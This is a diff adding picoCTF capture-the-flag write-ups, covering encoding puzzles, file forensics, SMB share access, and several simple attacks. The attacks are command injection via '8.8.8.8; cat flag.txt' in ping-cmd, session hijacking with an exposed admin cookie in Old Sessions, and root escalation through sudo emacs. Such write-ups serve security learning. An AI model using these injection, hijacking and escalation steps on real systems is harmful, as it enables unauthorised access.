@@ -1262,4 +1262,665 @@ strings disko-1.dd | grep "pico"
 We get the flag
 
 
-## 
+## Undo
+
+Connect to the challenge:
+```bash
+nc foggy-cliff.picoctf.net 63425
+```
+Question1
+```
+Base64 encoded the string
+```
+
+Linux Command will be:
+```bash
+base64 -d
+```
+
+Question2
+```
+Reversed the text
+```
+
+Linux Command will be:
+```bash
+rev
+```
+
+Question3
+```
+Replaced underscores with dashes
+```
+
+Linux Command will be:
+```bash
+tr '-' '_'
+```
+
+Question4
+```
+Replaced curly braces with parentheses
+```
+
+Linux Command will be:
+```bash
+tr '()' '{}'
+```
+
+Question5
+```
+Applied ROT13 to letters
+```
+
+Linux Command will be:
+```bash
+tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+Finally we get the flag
+
+
+## MY GIT
+
+Clone the repository:
+```bash
+git clone ssh://git@foggy-cliff.picoctf.net:49378/git/challenge.git
+```
+
+Password:
+```
+3a51a2e1
+```
+
+Go to the repository and inspect it:
+
+```bash
+cd challenge
+ls
+cat README.md
+```
+
+README says:
+```
+Only flag.txt pushed by root:root@picoctf will be updated with the flag.
+```
+
+Create a flag file:
+```bash
+echo test > flag.txt
+```
+
+Commit as `root@picoctf`:
+```bash
+git add flag.txt
+git -c user.name="root" -c user.email="root@picoctf" commit -m "add flag"
+```
+
+Push the commit:
+```bash
+git push origin master
+```
+
+We get the flag
+
+
+## bytemancy 1
+Source code contains:
+```python
+if user_input == "\x65"*1751:
+```
+
+`\x65` is hexadecimal for ASCII decimal `101`.
+
+ASCII decimal `101` = `e`
+
+Generate 1751 `e` characters:
+
+```bash
+python3 -c 'print("e"*1751)'
+```
+
+Now we can send them to nc
+```bash
+python3 -c 'print("e"*1751)' | nc foggy-cliff.picoctf.net 61908
+```
+
+Finally, we get the flag
+
+
+## Printer Shares
+
+Check the service:
+```bash
+nmap -sV -p 63241 mysterious-sea.picoctf.net
+```
+
+Output:
+```
+63241/tcp open  netbios-ssn Samba smbd
+```
+
+Enumerate SMB shares:
+```bash
+smbclient -L //mysterious-sea.picoctf.net -p 63241 -N
+```
+
+Output:
+```
+Sharename       Type
+---------       ----
+shares          Disk
+```
+
+Connect to the share:
+```bash
+smbclient //mysterious-sea.picoctf.net/shares -p 63241 -N
+```
+
+List files:
+```bash
+ls
+```
+
+Download the flag:
+```bash
+get flag.txt
+```
+
+This donwloads the file to the local system, Now we can read the flag.
+```bash
+cat flag.txt
+```
+
+Finally, we get the flag.
+
+
+## ping-cmd
+
+Connect to the challenge:
+```bash
+nc mysterious-sea.picoctf.net 65442
+```
+
+The server claims it only allows:
+```
+8.8.8.8
+```
+
+Testing command injection:
+```text
+8.8.8.8; ls
+```
+
+Output:
+```
+flag.txt
+script.sh
+```
+
+Read the flag:
+```text
+8.8.8.8; cat flag.txt
+```
+Finally, we get the flag.
+
+
+## bytemancy 0
+
+Source code contains:
+```python
+if user_input == "\x65\x65\x65":
+```
+
+`\x65` is hexadecimal for ASCII decimal `101`.
+
+ASCII decimal `101` = `e`
+
+Therefore:
+```text
+eee
+```
+
+Connect to the challenge:
+```bash
+nc candy-mountain.picoctf.net 55915
+```
+
+Enter:
+```text
+eee
+```
+
+Or automate:
+```bash
+echo eee | nc candy-mountain.picoctf.net 55915
+```
+
+We get the flag
+
+
+## Piece by Piece
+
+SSH into the challenge:
+```bash
+ssh ctf-player@dolphin-cove.picoctf.net -p 54945
+```
+
+Password:
+```text
+1ad5be0d
+```
+
+List files:
+```bash
+ls -lah
+```
+
+Files found:
+```text
+part_aa
+part_ab
+part_ac
+part_ad
+part_ae
+```
+
+Read the instructions:
+```bash
+cat instructions.txt
+```
+
+Output
+```
+The flag is split into multiple parts as a zipped file.
+Use Linux commands to combine the parts into one file.
+The zip file is password protected.
+Password: supersecret
+```
+
+Combine the file parts:
+```bash
+cat part_* > flag.zip
+```
+
+Verify the file type:
+```bash
+file flag.zip
+```
+
+Extract the zip file:
+```bash
+unzip flag.zip
+```
+
+Password:
+```text
+supersecret
+```
+
+Read the extracted file:
+```bash
+cat flag.txt
+```
+
+We get the flag.
+
+
+## Old Sessions
+
+Browse to:
+```text
+http://dolphin-cove.picoctf.net:50074/login
+```
+
+Register a new account `test` password `test` and login.
+
+Homepage after login:
+
+![OldSessions1](Pictures\OldSessions1.png)
+
+One of the comments contains a hint:
+```text
+Hey I found a strange page at /sessions
+```
+
+Navigate to:
+```text
+http://dolphin-cove.picoctf.net:50074/sessions
+```
+
+The page reveals all active sessions:
+```text
+1) session:7_l8FbGKimadDK55Ut1S2kWzIimJwRtXYtJvyaHj-5c, {'_permanent': True, 'key': 'admin'}
+
+2) session:qcaC_MhZNpakfOrmEyhWOY12bWI5dj8p05ZkSxw2-Wo, {'_permanent': True, 'key': 'test'}
+```
+
+The application stores sessions indefinitely and exposes them publicly.
+
+Open Developer Tools:
+
+```text
+F12 → Application → Cookies
+```
+
+Replace your session cookie value with the admin session:
+```text
+7_l8FbGKimadDK55Ut1S2kWzIimJwRtXYtJvyaHj-5c
+```
+
+![OldSessions2](Pictures\OldSessions2.png)
+
+Refresh the page and it opens to admin session
+
+Admin session:
+![OldSessions3](Pictures\OldSessions3.png)
+
+We get the flag
+
+
+## SUDO MAKE ME A SANDWICH
+
+SSH into the challenge:
+```bash
+ssh -p 49718 ctf-player@green-hill.picoctf.net
+```
+
+Password:
+```text
+deebe023
+```
+
+Check sudo permissions:
+```bash
+sudo -l
+```
+
+Output:
+```text
+User ctf-player may run the following commands on challenge:
+    (ALL) NOPASSWD: /bin/emacs
+```
+
+Check the flag permissions:
+```bash
+ls -la
+```
+
+Output:
+```text
+-r--r----- 1 root root 31 flag.txt
+```
+
+Reading directly fails:
+```bash
+cat flag.txt
+```
+
+Output:
+```text
+cat: flag.txt: Permission denied
+```
+
+Since Emacs can be executed as root, launch it with sudo:
+```bash
+sudo emacs
+```
+
+Inside Emacs:
+```text
+Alt + x
+```
+
+Type:
+```text
+shell
+```
+
+Press Enter.
+
+Verify root access:
+```bash
+whoami
+```
+
+Output:
+```text
+root
+```
+
+![SudoMakeMeASandwich](Pictures\SudoMakeMeASandwich.png)
+
+Read the flag:
+```bash
+cat flag.txt
+```
+We get the flag
+
+
+## Binary Digits
+
+The file contains only `0` and `1` characters.
+
+Checking the first bytes after grouping into 8-bit chunks reveals:
+
+```text
+FF D8 FF E0 00 10 4A 46 49 46
+```
+
+This is the header of a JPEG file (`JFIF`).
+
+So the string is actually an Image.
+
+Convert the binary string into bytes:
+```bash
+python3 -c "
+data=open('digits.bin').read().strip()
+open('out.jpg','wb').write(
+    bytes(int(data[i:i+8],2) for i in range(0,len(data),8))
+)
+"
+```
+
+We get the image Opening the image we get the flag.
+
+
+## Riddle Registry
+
+Copy Pasting the text to escape the Censored contents doesnt help much as it gives
+
+```text
+Title: The Ultimate Guide to Flag Hunting
+Welcome to the challenge!
+Don’t worry, this might look like gibberish, but maybe there’s something hidden somewhere? I
+spent so much time creating this PDF with care... or maybe not!
+Here’s a Quick Story:
+Once upon a time, in a land far, far away, there was a secret... But where could it be? Hidden
+deep within the document? Maybe the text holds clues?
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer posuere erat a ante venenatis
+dapibus posuere velit aliquet. Aenean lacinia bibendum nulla sed consectetur. Fusce dapibus,
+tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet
+risus. Curabitur blandit tempus porttitor. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
+You thought this was important? Nah, it’s just random text. Keep looking. Or maybe, just
+maybe, you’re in the wrong place?
+Special Hidden Section:
+The author have done a great and good job
+Don’t bother trying to reveal the hidden text, it’s just nonsense anyway. Even if you somehow
+manage to do it, all you’ll get is:
+No flag here. Nice try though!
+If you're still reading this, I’ll tell you a secret: the answer might not be here after all...
+Good luck! You’ll need it!
+```
+
+Now lets look at the PDF metadata:
+```bash
+exiftool confidential.pdf
+```
+
+Output:
+```text
+Author : cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV9jOGY5MWQ2OH0=
+```
+This is clearly Base64
+
+Decode the Base64 string:
+```bash
+echo "cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2YwdW5kIV9jOGY5MWQ2OH0=" | base64 -d
+```
+We get the flag.
+
+
+## Hidden in plainsight
+
+Inspect the image metadata:
+```bash
+exiftool img.jpg
+```
+
+Output:
+```text
+Comment : c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9
+```
+
+This is clearly a Base64, we can get to know from `Cipher Identifier Website`
+
+Decoding the Base64 string:
+```bash
+echo "c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9" | base64 -d
+```
+
+Output:
+```text
+steghide:cEF6endvcmQ=
+```
+
+Decode the second Base64 string:
+```bash
+echo "cEF6endvcmQ=" | base64 -d
+```
+
+Output:
+```text
+pAzzword
+```
+So we use **Steghide** to decode with the password as `pAzzword`
+
+Extract the hidden file:
+```bash
+steghide extract -sf img.jpg
+```
+
+Enter the passphrase:
+```text
+pAzzword
+```
+
+Output:
+
+```text
+wrote extracted data to "flag.txt".
+```
+
+Read the flag:
+```bash
+cat flag.txt
+```
+We get the flag
+
+
+# Flag in Flame
+
+Check the file type:
+```bash
+file logs.txt
+```
+
+The file contains a huge block of encoded text.
+
+Convert the encoded text into its original form:
+```bash
+base64 -d logs.txt > decoded.bin
+```
+
+Identify the resulting file:
+```bash
+file decoded.bin
+```
+
+Output:
+```text
+decoded.bin: PNG image data, 896 x 1152, 8-bit/color RGB, non-interlaced
+```
+
+The decoded file is actually an PNG image.
+
+```bash
+cp decoded.bin image.png
+```
+
+Attempt to search for strings:
+
+Opening the image we can see the text
+```text
+7069636F4354467B666F72656E736963735F616E616C797369735F69735F616D617A696E675F35646161346132667D
+```
+
+Convert the hex string to ASCII:
+```bash
+echo "7069636F4354467B666F72656E736963735F616E616C797369735F69735F616D617A696E675F35646161346132667D" | xxd -r -p
+```
+We get the flag.
+
+
+# Corrupted file
+
+Check the file type:
+```bash
+file file
+```
+
+Output:
+```text
+file: data
+```
+
+The file is not recognized.
+
+View the file header:
+```bash
+xxd file | head
+```
+
+Output:
+```text
+00000000: 5c78 ffe0 0010 4a46 4946 0001 0100 0001  \x....JFIF......
+```
+
+Clearly its a JPEG compressed file
+
+Notice the first bytes:
+```text
+5c 78 ff e0
+```
+
+A valid JPEG should begin with:
+```text
+ff d8 ff e0
+```
+
+The bytes `5c 78` (`\x`) have replaced the JPEG magic bytes `ff d8`.
+
+Use Python to restore the correct bytes:
+```bash
+python3 -c "
+data=bytearray(open('file','rb').read())
+data[0]=0xff
+data[1]=0xd8
+open('fixed.jpg','wb').write(data)
+"
+```
+
+Opening the `fixed.jpg` gives the Flag.
+
+
